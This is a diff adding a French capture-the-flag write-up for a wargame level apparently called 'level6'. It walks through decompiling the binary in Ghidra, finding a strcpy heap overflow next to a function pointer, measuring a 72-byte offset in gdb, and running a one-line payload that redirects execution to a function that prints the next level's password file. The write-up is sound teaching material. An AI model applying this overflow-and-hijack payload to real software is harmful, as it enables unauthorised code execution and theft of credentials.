@@ -1,0 +1,52 @@
+1. ls -la
+   -> level6
+
+2. ./level6
+   -> Segmentation fault (core dumped)
+
+3. ./level6 test
+   -> "Nope"
+
+4. Ghidra : Decompile de main()
+   void main(undefined4 param_1,int param_2) {
+     char *__dest;
+     undefined4 *puVar1;
+     __dest = malloc(0x40); # 64 bytes sur la heap
+     puVar1 = malloc(4); # 4 bytes (pointeur)
+     *puVar1 = m; # adresse de m()
+     strcpy(__dest,*(char **)(param_2 + 4));  # strcpy argv[1] dans __dest (ne vérifie jamais la taille)
+   }
+   -> Juste après __dest sur la heap = puVar1 (contient l'adresse de m())
+
+6. Ghidra : Decompile de m()
+   void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) {
+     puts("Nope");
+   }
+   -> appelée normalement
+
+7. Ghidra : Decompile de n()
+   void n(void) {
+     system("/bin/cat /home/user/level7/.pass");
+   }
+   -> Jamais call, présente dans le binaire -> objectif = remplacer l'adresse de m() par celle de n() dans puVar1 -> programme lance n()
+
+8. Ghidra : adresse de n()
+   -> 0x08048454
+
+9. on cherche l'offset entre __dest et le pointeur de fonction (heap) :
+   gdb level6
+   run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP
+   -> "Nope" (pas encore assez long pour écraser le pointeur)
+   run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
+   -> Program received signal SIGSEGV
+   -> 0x53535353 in ?? ()
+   -> "SSSS" (0x53 = 'S') a écrasé le pointeur de fonction
+
+10. python -c "print('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'.find('SSSS'))"
+    -> 72 bytes de padding avant d'écraser le pointeur de fct puVar1
+
+11. payload :
+    [72 bytes de padding] + [adresse de n() en little-endian : 4 bytes]
+    0x08048454 -> \x54\x84\x04\x08
+    ./level6 $(python -c "print('A'*72 + '\x54\x84\x04\x08')")
+    -> .pass de level7 s'affiche
